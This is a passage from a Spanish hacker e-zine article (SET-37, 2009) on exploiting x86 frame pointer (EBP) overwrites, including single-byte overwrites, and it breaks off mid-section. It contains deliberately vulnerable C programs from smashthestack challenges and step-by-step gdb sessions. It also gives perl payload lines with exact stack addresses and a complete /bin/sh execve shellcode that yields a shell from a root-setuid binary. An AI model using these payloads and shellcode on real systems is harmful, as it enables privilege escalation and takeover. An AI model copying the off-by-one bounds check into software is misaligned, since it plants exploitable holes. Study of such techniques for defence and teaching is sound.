@@ -1,0 +1,1081 @@
+-[ 0x02 ]--------------------------------------------------------------------
+-[ Jugando con Frame Pointer ]-----------------------------------------------
+-[ by blackngel ]----------------------------------------------------SET-37--
+ 
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+1 - Introduccion
+
+2 - Abuso del Frame Pointer
+  2.1 - Analisis del Problema
+  2.2 - Ejecucion de Codigo
+ 
+3 - Un Solo Byte
+  3.1 - Situacion Ideal
+  3.2 - GCC 4.1 en Accion
+
+4 - Conclusion
+
+
+
+---[ 1 - Introduccion
+
+Lo que nos traemos entre manos son temas sobre explotacion de vulnerabilidades.
+
+Ya que el abuso clasico de overflows es un asunto que va perdiendo su interes
+a medida que se repiten las mismas tecnicas hasta la saciedad, este articulo
+pretende abrir otras perspectivas a temas un poco mas avanzados.
+
+El articulo no contiene informacion nueva, y admite que se basa directamente en
+papers como el primero de Phrack [1], en el que se describe la tecnica de abuso
+de un solo byte alterado en el Frame Pointer y otros que explican de una u otra
+forma como aprovechar una sobrescritura completa de este mismo registro. 
+
+No obstante, este articulo no es ni por asomo una traduccion, se basa en la
+experiencia personal y en ejemplos particulares estudiados por su autor.
+
+Sencillamente vengo a cubrir un espacio vacio que no parece tener mucho interes
+en ser tratado ampliamente por los hispano-hablantes. Al menos no es demasiado
+facil encontrar esta clase de informacion en nuestro idioma.
+
+Disfruta del contenido que aqui presentamos y ya tendras tiempo de sobra para
+formular tu propia opinion al respecto.
+
+
+
+---[ 2 - Abusar el Frame Pointer
+
+A estas alturas incluso mi querida madre, que no tiene mucha idea de PC's,
+entiende como sobreescribir EIP. Es un cuento antiguo y muy explorado.
+Pero desgraciadamente (o no para los que adoramos nuevos retos), existen
+situaciones en que las condiciones de un desbordamiento son limitadas.
+
+A veces una comprobacion erronea en los limites de los buffers o las longitudes
+de las cadenas que los ocupan, puede llevar a la sobreescritura de registros del
+sistema.
+
+Pero en el mundo real no siempre EIP es alcanzable, y los gurus de la seguridad
+informatica vinieron a demostrar que era posible llegar a ejecucion de codigo
+arbitrario sobreescribiendo tan solo el registro base, conocido por muchos como
+Frame Pointer o registro EBP.
+
+Seguidamente detallaremos el problema y como sacar provecho de el en nuestro
+beneficio.
+
+
+
+---[ 2.1 - Analisis del Problema
+
+Debemos entender en primera instancia que es lo que ocurre en el momento en que
+se ejecuta un procedimiento (funcion) y que en el momento en que se sale de el.
+
+Lo primero que hace un programa antes de entrar en una funcion mediante la
+instruccion CALL, es pushear en la pila (stack) el registro EIP que volvera
+a tomar de la misma cuando vuelva de ella con la instruccion RET.
+
+Despues de pushear EIP se entra directamente en la primera direccion en la que
+comienza el codigo de la funcion y nos encontramos con el clasico prologo:
+
+     0x0804xxxx <proc+0>:       push   %ebp
+     0x0804xxxx <proc+1>:       mov    %esp,%ebp
+     0x0804xxxx <proc+3>:       sub    $0x100,%esp
+
+Es decir, que despues de EIP, se pushea EBP (Frame Pointer). Luego se crea un
+"marco local" (de ahi el nombre del registro ebp) igualando EBP con el lugar
+a donde apunta ESP (cima de la pila) y se decrementa ESP para hacer hueco a las
+variables declaradas como locales.
+
+Entonces nos queda en el stack algo como esto:
+
+       [ EIP ]
+       [ EBP ]
+       [ local var ]
+       [ local var ]
+       [ ... ]
+       -------------  <-  ( %ESP ) Apunta aqui
+
+Bien. Imaginese entonces que ahora dentro de la citada funcion se encuentra una
+llamada vulnerable a strcpy() o strncpy() que permita desbordar un buffer local
+de tamaño fijo.
+
+Lo que importa a aquellos que pueden sobreescribir directamente EIP, es que
+la instruccion ret tomara su nuevo registro sobreescrito como direccion EIP
+real en lugar de la que anteriormente habia pusheado CALL. Con esto basta para
+bifurcar el codigo original a una Shellcode colocada donde el atacante desee.
+
+¿Pero que ocurre si las funciones vulnerables solo nos dan espacio para alterar
+los 4 bytes que componen EBP? Pues que el estudio debe de ir un poco mas lejos.
+
+Aqui es donde los "epilogos de funcion" toman relevancia. Veamos que
+instrucciones se ejecutan alli:
+
+     0x0804xxxx <proc+yyx>:     movl   %ebp,%esp
+     0x0804xxxx <proc+yyy>:     popl   %ebp
+     0x0804xxxx <proc+yyz>:     ret
+
+Las dos primeras instrucciones son ejecutadas en la actualidad dentro de una:
+
+     0x0804xxxx <proc+yyx>:     leave  
+     0x0804xxxx <proc+yyz>:     ret 
+
+Pero el efecto es equivalente. Lo que ocurre es que el Frame Pointer actual
+es pasado al registro ESP, y seguidamente el registro EBP es popeado antes de
+volver a la funcion llamadora.
+
+¿Que significa esto? Para que nadie se confunda... la primera instruccion es
+irrelevante, ya que el registro EBP que se copia en ESP no es el que hemos
+desbordado, sino el nuevo apuntador local que se creo en el prologo con
+"movl %esp, %ebp".
+
+Lo importante es la instruccion "popl %ebp". Esta instruccion si restaura nuestro
+registro modificado en la pila y por tanto quedara alterado. Entonces la funcion
+retorna. Veamos que hemos logrado:
+
+       Situacion normal:         Situacion overflow:
+
+       [ EIP ]                   [EIP]
+       [ EBP guardado ]          [0x41414141]
+       [ buffer ]                [AAAAAAA...]
+       ----------------          ------------
+
+Despues de haber conseguido un overflow de EBP, la instruccion "popl %ebp"
+recogera de la pila la direccion "0x41414141" como si fuera el EBP guardado
+en el prologo.
+
+Una vez la funcion retorna, solo hemos logrado modificar el Frame Pointer,
+y como EIP sigue intacto, el programa seguira su curso normal sin bifurcar
+a ningun codigo de nuestra eleccion. Pero esto no se ha acabado, veamos que
+ocurre en la funcion que ejecuto el "CALL"...
+
+Como comprenderas, el codigo ejecutor de la llamada "CALL" es a su vez otra
+funcion, ya sea main() u otra cualquiera. Por lo tanto, dispondra de un
+"epilogo" como el resto. Veamos como esto afecta a nuestro ejemplo:
+
+     0x0804xxxx <main+yyx>:     movl   %ebp,%esp
+     0x0804xxxx <main+yyy>:     popl   %ebp
+     0x0804xxxx <main+yyz>:     ret
+
+Otra vez las mismas instrucciones. Pero ahora hay algo mas interesante. La
+primera instruccion que antes dejabamos de lado, ahora cobra vida. Nuestro
+registro EBP modificado es pasado a ESP, luego el EBP guardado por "main()"
+(este no es nuestro EBP modificado) es popeado de la pila y la funcion retorna.
+
+Veamoslo graficamente:
+
+     movl %ebp,%esp -> movl 0x41414141,%esp -> ESP = 0X41414141
+
+Hemos logardo modificar ESP a traves del EBP alterado dentro de "funcion()".
+Recuerda que ESP es un apuntador a la cima de la pila, y aumenta o decrementa
+su direccion a media que los elementos son "popeados" o "pusheados" en la misma.
+
+¿Que obtenemos entonces tras la instruccion "popl %ebp"? Pues que ESP aumenta su
+direccion 4 bytes. (Recuerda que la pila crece hacia las direcciones bajas de
+memoria).
+
+     Nos queda:   ESP + 4 = 0x41414141 + 4 = [ 0x41414145 ]
+
+De esto sacamos que si deseamos un "0x41414141" en ESP, debemos desbordar EBP
+previamente con la direccion deseada menos cuatro bytes, "0x4141413d".
+
+Vale, antes habiamos modificado EBP y preguntabas: ¿Y que?
+Ahora hemos logrado modificar ESP y te preguntas: ¿Y que?
+
+Pues resulta que el comportamiento normal de un procedimiento, es que al volver
+de este, se busca por una direccion situada dentro de la direccion contenida en
+ESP, y se toma como si fuera el nuevo EIP. Graficamente se vera mas claro.
+
+Imaginate que hubisemos logrado modificar ESP con "0xbfffed88":
+
+     ESP = 0xbfffed88;
+
+Al final del procedimiento se mira el contenido de la direccion en ESP. Piensa
+que dentro de esta estuviera:
+
+     Contenido de 0xbfffed88 -> 0xbfffd2ab
+
+Pues esta ultima direccion se toma como EIP y se ejecuta el codigo que alli se
+encuentra.
+
+¿Y que si modificamos ESP, para que apunte a un lugar donde colocamos una
+direccion de nuestra eleccion, que a su vez apunte a un Shellcode tradicional?
+
+La solucion en la siguiente seccion.
+
+
+---[ 2.2 - Ejecucion de Codigo
+
+Me gusta llamar a lo que acabamos de describir en la seccion anterior como:
+
+     "Un Doble Salto"
+
+Es decir, no se ejecuta el codigo contenido en la direccion modificada. Sino
+que se ejecuta el codigo contenido dentro de la direccion contenida en la
+direccion modificada. Mas claro:
+
+   [ESP alterado] -> Apunta a -> [direccion elegida] -> Apunta a -> [Shellcode]
+                                          ^                            ^
+                                          |                            |
+                                EIP tomara este valor y ejecutara esto -
+
+Dado que este articulo se basa en un paradigma conocido como "Teoria a traves
+de la Practica", presentaremos a continuacion un ejemplo de programa vulnerable
+y veremos hasta que punto podemos explotarlo para llegar a ejecucion de codigo
+arbitrario.
+
+[-----]
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int limit, c;
+
+int getebp()
+{
+   __asm__("movl %ebp, %eax");
+}
+
+int proc(char *nombre)
+{
+   int *i;
+   char buffer[256];
+
+   i = (int *) getebp();
+   limit = *i - (int)buffer + 4;
+
+   for (c = 0; c < limit && nombre[c] != '\0'; c++)
+      buffer[c] = nombre[c];
+
+   printf("\nEncantado de conocerte: %s\n", buffer);
+   return 0;
+}
+
+int main(int argc, char *argv[])
+{
+   if (argc < 2) {
+      fprintf(stderr, "\nUso: %s <nombre>\n", argv[0]);
+      exit(0);
+   }
+
+   proc(argv[1]);
+
+   return 0;
+}
+
+
+[-----]
+
+Este programa es tan solo un pelin mas raro que los tipicos que encontraras
+en un monton de articulos. Esta extraido en parte de un reto presentado en
+"smashthestack.org".
+
+A pesar de que "proc()" parezca algo enrevesado, no es para tanto. Lo que se
+calcula en "limit" es la distancia que hay entre la direccion de "buffer[]" y
+la direccion de EBP. Como el puntero "*i", que ocupa 4 bytes, se situa en la
+pila entre "buffer[]" y EBP, la distancia de estos dos ultimos sera de 260
+bytes. A esto se le suma un "4" , y he aqui el bug, 4 bytes sobrantes que
+permiten sobreescribir EBP.
+
+Podriamos utilizar el entorno u otros argumentos pasados al programa para situar
+nuestra shellcode o direccion de retorno. Pero en este caso veremos como hacerlo
+todo directamente desde argv[1], cuyo contenido sera pasado a "buffer".
+
+Segun lo explicado en la seccion anterior, lo que necesitamos dentro del buffer
+es:
+
+   1) Una direccion que sobreescriba EBP y apunte al contenido de otra direccion.
+   2) Una direccion dentro del buffer que apunte a nuestro Shellcode.
+   3) Un Shellcode que ejecute "/bin/sh" (tal vez con llamada setreuid()).
+
+Nuestro buffer puede tener distintas formas, por ejemplo:
+
+
+     [                BUFFER              ] [ *i ] [ EBP ] [ EIP ]
+     -------------------------------------------------------------
+     [ DIRECCION DE SC ] [ RELLENO ] [ SHELLCODE ] [ RET ] [ EIP ]
+     [ SHELLCODE ] [ RELLENO ] [ DIRECCION DE SC ] [ RET ] [ EIP ]
+     [ DIRECCION DE SC ] [ SHELLCODE ] [ RELLENO ] [ RET ] [ EIP ]
+
+
+Pero lo importante es que se cumpla lo siguiente:
+
+             o---------o                           [ EBP ]
+             |          \
+     [ DIRECCION DE SC ] [ SHELLCODE ] [ RELLENO ] [ RET ] [ EIP ]
+     ^                                                |
+     o------------------------------------------------o
+
+Puedes ver que da igual donde se situe shellcode o la direccion por la que es
+apuntada siempre que el encadenamiento sea correcto. Es por ello que podrias
+situar por ejemplo la direccion al Shellcode en una variable de entorno, hacer
+que esta apunte a ARGV[2] si situas alli la misma, siempre que hagas que RET
+(que sobreescribe EBP) apunte a la direccion de la variable de entorno. No
+olvides que debes restar un "4" al valor de esta direccion.
+
+Al final todo son posiciones de memoria y puedes andar saltando de una a otra
+todas las veces que te apetezca.
+
+Tomaremos como ejemplo el ultimo ordenamiento de buffer mostrado por ser el
+mas sencillo. Cuando sepas jugar con las direcciones podras probar el resto.
+
+1) Lo primero que necesitamos es una direccion con la que sobreescribir EBP,
+   y la condicion es que apunte a [ DIRECCION DE SC ], que es la misma
+   direccion que el inicio de nuestro "buffer" (por eso es sencillo).
+
+2) Luego [DIRECCION DE SC], tiene que apuntar a donde se encuentra nuestro
+   [ SHELLCODE ], que en este ejemplo sera 4 bytes mas lejos que la posicion
+   de memoria donde se encuentra [ DIRECCION DE SC ] (por eso es sencillo).
+
+Compilemos el programa vulnerable y veamos entonces como obtener la direccion
+del inicio de nuestro "buffer" a desbordar:
+
+* NOTA: Las pruebas han sido realizadas con gcc-3.3, a partir de la 4.1 se
+        establecen protecciones de pila por defecto.
+
+blackngel@mac:~/pruebas/bof$ gcc-3.3 saludo.c -o saludo
+blackngel@mac:~/pruebas/bof$ ls -al saludo
+-rwxr-xr-x 1 blackngel blackngel 6977 2009-01-12 15:54 saludo
+
+blackngel@mac:~/pruebas/bof$ sudo chown root:root ./saludo
+blackngel@mac:~/pruebas/bof$ sudo chmod u+s ./saludo
+blackngel@mac:~/pruebas/bof$ ls -al saludo
+-rwsr-xr-x 1 root root 6977 2009-01-12 15:54 saludo
+
+Demostremos antes de nada que todo lo dicho hasta ahora es cierto:
+
+[-----]
+
+blackngel@mac:~/pruebas/bof$ gdb ./saludo
+GNU gdb 6.8-debian
+Copyright (C) 2008 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu"...
+(gdb) disass proc
+Dump of assembler code for function proc:
+0x080483fb <proc+0>:    push   %ebp
+0x080483fc <proc+1>:    mov    %esp,%ebp
+0x080483fe <proc+3>:    sub    $0x128,%esp
+
+[-----]
+
+Bueno, como esto es un ejemplo real, hay problemas reales. Vemos que la
+instruccion "sub $0x128,%esp", reserva 296 bytes para nuestro "buffer" y
+el puntero "*i", cuando deberia haber reservado: 256 + 4 = 260.
+
+Los compiladores hacen este tipo de cosas debido a temas de alineacion y
+optimizacion, pero en nuestro ejemplo eso no sera un impedimento, ya que 
+controlamos exactamente hasta donde podemos escribir. Sigamos:
+
+[-----]
+
+0x08048486 <proc+139>:	mov    $0x0,%eax
+0x0804848b <proc+144>:	leave  
+0x0804848c <proc+145>:	ret    
+End of assembler dump.
+
+(gdb) break *proc+145                             // Detener despues de "leave"
+Breakpoint 1 at 0x804848c
+
+(gdb) run `perl -e 'print "A"x265'`
+Starting program: /home/blackngel/pruebas/bo/saludo `perl -e 'print "A"x265'`
+
+Encantado de conocerte:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   ?G
+
+Breakpoint 1, 0x0804848c in proc ()
+Current language:  auto; currently asm
+
+(gdb) info reg ebp
+ebp            0xbffff441	0xbffff441        // EBP tocado
+
+[-----]
+
+Con una longitud de 265 hemos sobreescrito un byte de EBP. Entonces con 268
+alteraremos sus cuatro bytes.
+
+[-----]
+
+(gdb) run `perl -e 'print "A"x268'`
+....
+....
+Breakpoint 1, 0x0804848c in proc ()
+(gdb) info reg ebp
+ebp            0x41414141	0x41414141        // EBP hundido
+
+(gdb) info reg eip
+eip            0x804848c	0x804848c <proc+145>
+
+[-----]
+
+En otra situacion pensarias que sobreescribiendo 4 bytes mas alla (272),
+tendrias el control de EIP en tus manos. Comprobemos que no es cierto:
+
+[-----]
+
+(gdb) run `perl -e 'print "A"x272'`
+.....
+.....
+Breakpoint 1, 0x0804848c in proc ()
+(gdb) info reg ebp
+ebp            0x41414141	0x41414141
+(gdb) info reg eip
+eip            0x804848c	0x804848c <proc+145>
+
+[-----]
+
+Exacto, EIP sigue poseyendo su anterior valor, erroneo por cierto, pero no el
+que nosotros deseamos. De momento, lo unico que tenemos es una "Denegacion de
+Servicio" (DoS).
+
+Bien, como dijimos lo primero a obtener es la direccion de nuestro "buffer",
+que sera al tiempo la direccion de [DIRECCION DE SC].
+
+El registro ESP apunta al principio de las variables locales, si lo consultamos
+despues de que "ARGV[1]" haya sido copiado en "buffer[]", y antes de que se
+ejecute la instruccion "leave" (recuerda que modifica a %esp), muy cerca
+encontraremos el principio de "buffer" 
+
+[-----]
+
+blackngel@mac:~/pruebas/bo$ gdb  -q ./saludo
+(gdb) disass proc
+Dump of assembler code for function proc:
+0x080483fb <proc+0>:	push   %ebp
+0x080483fc <proc+1>:	mov    %esp,%ebp
+0x080483fe <proc+3>:	sub    $0x128,%esp
+0x08048404 <proc+9>:	call   0x80483f4 <getebp>
+..........
+..........
+0x08048486 <proc+139>:	mov    $0x0,%eax
+0x0804848b <proc+144>:	leave  
+0x0804848c <proc+145>:	ret    
+End of assembler dump.
+
+(gdb) break *proc+139                           // Entre el volcado y "leave"
+Breakpoint 1 at 0x8048486
+
+(gdb) run `perl -e 'print "A"x268'`
+Starting program: /home/blackngel/pruebas/bo/saludo `perl -e 'print "A"x268'`
+
+Breakpoint 1, 0x08048486 in proc ()
+Current language:  auto; currently asm
+(gdb) x/24 $esp
+0xbffff310:	0x080485b4	0xbffff330	0x00000000	0x00000000
+0xbffff320:	0x00000000	0x00000000	0xb7ffb59c	0xbffff308
+0xbffff330:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff340:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff350:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff360:	0x41414141	0x41414141	0x41414141	0x41414141
+(gdb) 
+
+[-----]
+
+Ya tenemos lo que buscabamos, la direccion de inicio de nuestro buffer en:
+
+   Inicio buffer -> [ 0xbffff330 ]
+
+Si ahora sobreescribieramos EBP con esta direccion, ESP tambien tomaria ese
+valor al final de main() y despues de la instrucion "ret" se comprobaria que
+hay dentro de ella, en este caso [ 0x41414141 ], EIP tomaria ese valor e
+intentaria ejecutar el codigo que alli se encuente. Veamoslo:
+
+[-----]
+
+(gdb) disass main
+Dump of assembler code for function main:
+0x0804848d <main+0>:	push   %ebp
+0x0804848e <main+1>:	mov    %esp,%ebp
+0x08048490 <main+3>:	sub    $0x18,%esp
+..........
+..........
+0x080484d8 <main+75>:	call   0x80483fb <proc>
+0x080484dd <main+80>:	mov    $0x0,%eax
+0x080484e2 <main+85>:	leave  
+0x080484e3 <main+86>:	ret    
+End of assembler dump.
+
+(gdb) break *main+86                              // Despues de EBP modificado
+Breakpoint 2 at 0x80484e3
+
+(gdb) run `perl -e 'print "A" x 264 . "\x30\xf3\xff\xbf";'`
+
+Breakpoint 1, 0x08048486 in proc ()
+(gdb) c                                           // EBP ya fue alterado
+Continuing.
+
+Breakpoint 2, 0x080484e3 in main ()
+(gdb) info reg esp                                // ESP = EBP + 4
+esp            0xbffff334	0xbffff334
+
+(gdb) x/x $esp
+0xbffff334:	0x41414141
+
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) 
+
+
+[-----]
+
+Bingo! Solo nos equivocamos en algo, y es que como dije anteriormente, la
+instruccion "popl %ebp" provoca un aumento de 4 bytes en ESP, de ahi que
+acabe en 34 y no 30 como habiamos pensado. De modo que para conseguir
+apuntar al principio del "buffer" debemos sobreescribir EBP con [ 0xbffff32c ]. 
+
+En [ 0xbffff330 ] debemos colocar otra direccion que apunte a nuestra Shellcode,
+y como la Shellcode ira justo despues de esta direccion, es decir, 4 bytes mas
+alla, pues su direccion sera [ 0xbffff334 ] (esta es la direccion real, aqui no
+hay nada que restar ni sumar).
+
+Lo que tenemos en mente es esto pues:
+
+     [               BUFFER              ] [ *i ] [     EBP    ] [ EIP ]
+     [ 0xbffff334 ] [   SHELLCODE   ] [ RELLENO ] [ 0xbffff32C ] [ EIP ]
+     ^              ^
+     0xbffff330     0xbffff334
+
+A estas alturas dare por supuesto que sabes como elegir una Shellcode para
+Linux y volcarla en un fichero, por ejemplo "/tmp/sc". Sere bueno, algo asi:
+
+$ echo `perl -e 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46
+\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd
+\x80\xe8\xdc\xff\xff\xff/bin/sh";'` > /tmp/sc
+
+Pongamos en practica nuestra tecnica:
+
+[-----]
+
+(gdb) disass proc
+Dump of assembler code for function proc:
+0x080483fb <proc+0>:	push   %ebp
+0x080483fc <proc+1>:	mov    %esp,%ebp
+0x080483fe <proc+3>:	sub    $0x128,%esp
+..........
+..........
+0x08048486 <proc+139>:	mov    $0x0,%eax
+0x0804848b <proc+144>:	leave  
+0x0804848c <proc+145>:	ret    
+End of assembler dump.
+
+(gdb) break *proc+145                        // Tras recuperar EBP alterado
+Breakpoint 3 at 0x804848c
+
+(gdb) run `perl -e 'print "\x34\xf3\xff\xbf";'``cat /tmp/sc`
+`perl -e 'print "A"x215 . "\x2c\xf3\xff\xbf";'`
+..........
+..........
+..........
+Breakpoint 1, 0x08048486 in proc ()          // Se detiene antes de "leave"
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x0804848c in proc ()          // Se detiene despues de "leave"
+(gdb) info reg ebp
+ebp            0xbffff32c	0xbffff32c   // EBP alterado
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x080484e3 in main ()          // Se detiene despues de "leave"
+(gdb) info reg esp
+esp            0xbffff330	0xbffff330   // ESP = EBP + 4
+(gdb) x/x $esp
+0xbffff330:	0xbffff334                   // ESP contiene [ DIRECCION SC ]
+(gdb) c
+Continuing.                                  // EIP ejecuta Shellcode
+
+.....
+.....
+sh-3.2$                                      // Sorpresa !!!
+
+[-----]
+
+Aja, ya es nuestro!
+
+Y hasta aqui la idea principal. Ahora ya sabes como controlar el Frame Pointer
+para diversion y beneficio. Sobre todo para diversion, ¿NO? };-D
+
+
+
+---[ 3 - Un Solo Byte
+
+Nuevamente, en la vida real, siguen existiendo situaciones mas complejas que la
+que acabamos de ver hace un momento.
+
+Tal vez por una confusion a la hora de determinar donde acaba el byte "\0" de
+fin de cadena o por cualquier otro descuido, existen programas que permiten la
+la alteracion del ultimo byte de EBP.
+
+Quizas sea el destino, o tal vez la suerte, pero gracias a la estructura
+"little-endian" podemos modificar este ultimo byte en beneficio propio.
+
+Ahora si, veamos el programa tal cual fue extraido de uno de los retos
+propuestos por "smashthestack.org".
+
+[-----]
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int limit, c;
+int getebp() { __asm__("movl %ebp, %eax"); }
+
+void f(char *s)
+{
+	int *i;
+	char buf[256];
+
+	i = (int *) getebp();
+	limit = *i - (int)buf + 1;
+
+	for (c = 0; c < limit && s[c] != '\0'; c++)
+		buf[c] = s[c];
+}
+
+int main(int argc, char **argv)
+{
+	int cookie = 1000;
+
+	f(argv[1]);
+
+	if ( cookie == 0xdefaced ) {
+		setresuid(geteuid(), geteuid(), geteuid());
+		execlp("/bin/sh", "/bin/sh", "-i", NULL);
+	}
+	return 0;
+}
+
+[-----]
+
+
+
+
+---[ 3.1 - Situacion Ideal
+
+En la teoria, podemos escribir en "buf" 261 caracteres (bytes). Digo en la
+teoria, porque si volvemos a los problemas de alineacion esto no siempre sera
+asi. Se vera en las siguientes secciones cuando tratemos de explotarlo.
+
+En la teoria, digo, tenemos la capacidad de sobreescribir por entero el
+puntero "*i" y adicionalmente el primer byte del registro EBP (nuestro
+querido Frame Pointer).
+
+Como se menciono al principio de este articulo, esta tecnica ya fue descrita por
+"klog" en su articulo "The Frame Pointer Overwrite". Pero alli se describio la
+"Situacion Ideal", en la que todos los condicionantes previos se ponian del lado
+del atacante.
+
+Ya comentada la tecnica sobre el abuso de EBP, no comenzaremos una introduccion
+desde el principio. Pero veamos que ocurre:
+
+     Situacion normal (ejemplo):
+
+     [              BUFFER (256 bytes)       ] [ *i (4bytes) ] [     EBP    ]
+     [ BLACKNGEL                             ] [ 0x08048358  ] [ 0xbfffef8a ]
+
+     Situacion ataque:
+
+     [ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ] [ 0x41414141  ] [ 0xbfffef41 ]
+
+* NOTA: Las direcciones se colocan en memoria en modo little-endian
+        (al reves vamos).
+
+Poder sobreescribir un solo byte de EBP, no es la panacea, pero si lo suficiente
+como para lograr ejecutar codigo arbitrario.
+
+Veamos la situacion ideal que presenta "klog". Se pretende atacar el buffer
+con una ordenacion como la siguiente:
+
+     [ NOPS ] [ SHELLCODE ] [ DIRECCION DE SC] [ 1 BYTE PARA ALTERAR EBP ]
+
+*****
+Quizas ahora te estes preguntando por que no utilizamos en el exploit anterior
+un relleno de NOPS tipo: [ DIRECCION SC ] [NOPS] [ SHELLCODE ] [ RET ], lo cual
+facilita enormemente el ataque.
+
+Ya me conoces... si sabes hacer algo de forma milimetrica, tienes tiempo de sobra
+para hacerlo mas facil con un poco de ayuda.
+*****
+
+Continuamos, "klog" propone las siguientes condiciones:
+
+   1) Que EBP contiene una direccion como: [ 0xbfffefxx ].
+   2) Que BUFFER se encuentra en una direccion igual: [0xbfffefxx]
+   3) Que BUFFER es lo suficientemente grande como para albergar
+      Shellcode y la direccion por la que es apuntada.
+   4) Y que gracias a esto podemos colocar una direccion en BUFFER
+      apuntando a un Shellcode, y hacer que EBP, y por lo tanto ESP,
+      apunten a esta direccion solo modificando el ultimo byte.
+
+Si esta situacion se presenta en la realidad, estariamos realizando exactamente
+el mismo ataque que estudiamos en secciones previas. Tanto EBP como la direccion
+en memoria del BUFFER tienen que cumplir la condicion de que sus 3 primeros
+bytes sean igual. Solo entonces podremos jugar con los ultimos bytes.
+
+¿Cual es el problema entonces? El de siempre, ¿que ocurre si el tamaño del
+buffer no es lo suficientemente grande? Entonces tendremos que buscarnos la
+vida para colocar nuestra Shellcode en otro lugar y apuntar correctamente a
+ella.
+
+Mas adelante veremos como salvar esta situacion sin salirnos de los mismos
+argumentos del programa. Trabajar con el entorno queda de deberes para el
+lector.
+
+Llevemos a la practica antes de nada la tecnica de "klog":
+
+Cuando iniciamos un ataque de esta clase no importa mucho donde coloquemos
+la Shellcode. Lo unico que es relevante es lograr meter la direccion que
+apunta hacia ella en alguna posicion de memoria cuyos 3 primeros bytes sean
+iguales a los del EBP guardado.
+
+Recordemos algo interesante antes de comenzar. Cuando iniciamos el estudio
+del primer exploit, fuimos capacaces en un principio de sobreescribir el
+primer byte de EBP, y vimos una direccion como esta:
+
+     [ 0xbffff441 ] -> RAIZ = [ 0xbffff4 ] - 4º BYTE [ 0x41 ]
+
+Cuando descubrimos el comienzo del buffer vimos que era:
+
+     [ 0xbffff330 ] -> RAIZ = [ 0xbffff3 ] - 4º BYTE [ 0x30 ]  
+
+Si nosotros colocaramos esta vez [ DIRECCION DE SC ] al principio del buffer,
+dado que las raices de las direcciones de "buffer" y "EBP" no coinciden, no
+podriamos alcanzarlo de ninguna manera alterando solamente el ultimo byte.
+
+Pero por suerte podemos colocar [ DIRECCION DE SC ] donde mas nos apetezca, y
+como el final del buffer si esta en una posicion de memoria cuya raiz coincide
+con EBP, esa es la razon de la disposicion del "pastel" que ha previsto "klog".
+
+En realidad, en nuestro ejemplo, no colocamos esa direccion al final de "buffer"
+sino sobreescribiendo el puntero "*i", que se encuentra entre nuestro buffer y
+EBP.
+
+Basta de palabras y vamos directamente al debugging:
+
+[-----]
+
+blackngel@mac:~/pruebas/bo$ gdb -q ./f1
+(gdb) disass f
+Dump of assembler code for function f:
+0x080483eb <f+0>:	push   %ebp
+0x080483ec <f+1>:	mov    %esp,%ebp
+0x080483ee <f+3>:	sub    $0x118,%esp
+..........
+..........
+0x08048456 <f+107>:	jmp    0x8048419 <f+46>
+0x08048458 <f+109>:	leave  
+0x08048459 <f+110>:	ret    
+End of assembler dump.
+
+(gdb) break *f+109                          // Detener en "leave" sin ejecutar
+Breakpoint 1 at 0x8048458
+
+(gdb) break *f+110                          // Detener despues de "leave"
+Breakpoint 2 at 0x8048459
+
+(gdb) run `perl -e 'print "A"x280'`         // Probamos suerte
+Starting program: /home/blackngel/pruebas/bo/f1 `perl -e 'print "A"x280'`
+
+Breakpoint 1, 0x08048458 in f ()
+Current language:  auto; currently asm
+
+(gdb) x/24x $esp
+0xbffff300:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff310:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff320:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff330:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff340:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff350:	0x41414141	0x41414141	0x41414141	0x41414141
+(gdb) x/24x $esp-8
+0xbffff2f8:	0xbffff418	0x080483f9	0x41414141	0x41414141
+0xbffff308:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff318:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff328:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff338:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff348:	0x41414141	0x41414141	0x41414141	0x41414141
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048459 in f ()
+(gdb) info reg ebp
+ebp            0xbffff448	0xbffff448        // EBP no tocado
+
+(gdb) run `perl -e 'print "A"x281'`               // Provamos suerte otra vez
+Starting program: /home/blackngel/pruebas/bo/f1 `perl -e 'print "A"x281'`
+
+Breakpoint 1, 0x08048458 in f ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048459 in f ()
+(gdb) info reg ebp
+ebp            0xbffff441	0xbffff441        // EBP tocado y casi hundido
+
+[-----]
+
+A destacar:
+
+   1) ESP apunta directamente al principio del buffer [ 0xbffff300 ]
